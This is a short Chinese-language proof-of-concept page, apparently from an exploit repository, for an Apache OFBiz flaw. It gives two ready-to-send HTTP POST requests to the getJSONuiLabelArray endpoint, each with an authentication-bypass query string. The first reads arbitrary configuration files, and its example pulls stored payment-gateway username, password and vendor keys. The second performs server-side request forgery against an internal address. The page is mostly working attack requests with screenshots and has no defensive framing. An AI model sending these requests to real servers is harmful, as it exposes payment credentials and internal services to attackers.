## Apache OFBiz SSRF && 任意配置读取


## 任意文件读取漏洞 poc
以读取 applications/accounting/config/payment.properties 中的几个 key 为例

```
POST /webtools/control/getJSONuiLabelArray/?USERNAME=&PASSWORD=s&requirePasswordChange=Y HTTP/1.1
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.90 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Accept-Language: zh-CN,zh;q=0.9
Connection: close
Cache-Control: no-cache
Pragma: no-cache
Host: 
Content-type: application/x-www-form-urlencoded
Content-Length: 148

requiredLabels={"file:applications/accounting/config/payment.properties":["payment.verisign.user","payment.verisign.pwd","payment.verisign.vendor"]}
```
![image](https://github.com/wy876/POC/assets/139549762/093b6ca3-2917-4607-93a0-efaf2b3e2ca8)

## SSRF 
```
POST /webtools/control/getJSONuiLabelArray/?USERNAME=&PASSWORD=s&requirePasswordChange=Y HTTP/1.1
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.90 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Accept-Language: zh-CN,zh;q=0.9
Connection: close
Cache-Control: no-cache
Pragma: no-cache
Host: 
Content-type: application/x-www-form-urlencoded
Content-Length: 148

requiredLabels={"http://127.0.0.1/":["xxxxxx"]}
````

这里随便写一个 properties 文件，然后 python -m http.server 8000 起个服务
![image](https://github.com/wy876/POC/assets/139549762/683a3f21-0405-43f1-9d51-a44752107432)

![image](https://github.com/wy876/POC/assets/139549762/7f5e826e-9564-4343-bf1e-d0d530ab7a3a)

![image](https://github.com/wy876/POC/assets/139549762/beb30398-fa1b-4028-98f9-b3e8ccb4d90e)




## 漏洞来源
- https://xz.aliyun.com/t/13211
